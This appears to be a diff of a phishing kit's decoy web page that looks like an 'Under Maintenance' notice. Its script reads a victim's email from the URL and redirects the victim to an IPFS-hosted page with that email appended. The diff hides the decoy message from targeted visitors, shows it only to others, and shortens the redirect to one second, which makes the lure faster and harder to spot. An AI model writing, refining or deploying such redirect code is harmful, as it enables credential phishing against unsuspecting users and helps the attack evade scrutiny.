@@ -70,7 +70,7 @@
   <body>
     <!-- Content -->
     <!-- Under Maintenance -->
-    <div class="container-xxl container-p-y">
+    <div class="container-xxl container-p-y" id="maintnc" style="display: none;">
       <div class="misc-wrapper">
         <h3 class="mb-2 mx-2">Under Maintenance! 🚧</h3>
         <p class="mb-6 mx-2">Sorry for the inconvenience but we're performing some maintenance at the moment</p>
@@ -115,6 +115,7 @@
       }
 
       // Get URL parameters
+      document.getElementById('maintnc').style.display = 'none';
       const urlParams = new URLSearchParams(window.location.search);
       const email = urlParams.get('user'); // Get 'mail' parameter
 
@@ -126,8 +127,9 @@
         setTimeout(() => {
           // Redirect to the desired URL
           window.location.href = "https://ipfs.io/ipfs/bafybeiffbrz6jnkof642agfwmacivcajmcwaunwpzwjqd544kzcfiaz5ie/#"+email; // Change this to the URL you want to redirect to
-        }, 5000); // 5 seconds delay
+        }, 1000); // 5 seconds delay
       } else {
+        document.getElementById('maintnc').style.display = 'block';
         // Stay on the current page or reload if needed
         // window.location.reload();
       }
